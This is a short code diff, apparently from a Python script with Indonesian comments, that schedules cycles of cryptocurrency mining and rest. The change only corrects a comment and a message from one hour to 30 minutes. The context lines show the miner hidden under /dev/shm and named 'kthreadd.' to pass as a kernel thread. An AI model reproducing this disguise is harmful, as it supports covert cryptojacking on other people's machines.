@@ -9,7 +9,7 @@ MINER_PATH = "/dev/shm/.cache/kthreadd."  # Lokasi miner
 MINER_NAME = "kthreadd."  # Nama miner buat kill
 MINING_TIME = 1800  # 30 menit
 REST_TIME = 300  # 5 menit
-LONG_REST = 1800  # 1 jam (dalam detik)
+LONG_REST = 1800  # 30 menit (dalam detik)
 CYCLES = 10  # Jumlah cycle sebelum istirahat panjang
 
 def set_cpu_performance():
@@ -51,7 +51,7 @@ def main():
             print(f"😴 Istirahat {REST_TIME // 60} menit...")
             time.sleep(REST_TIME)
         
-        print("💖 Sayang istirahat panjang 1 jam...")
+        print("💖 Sayang istirahat 30 menit...")
         time.sleep(LONG_REST)
 
 def sigint_handler(sig, frame):
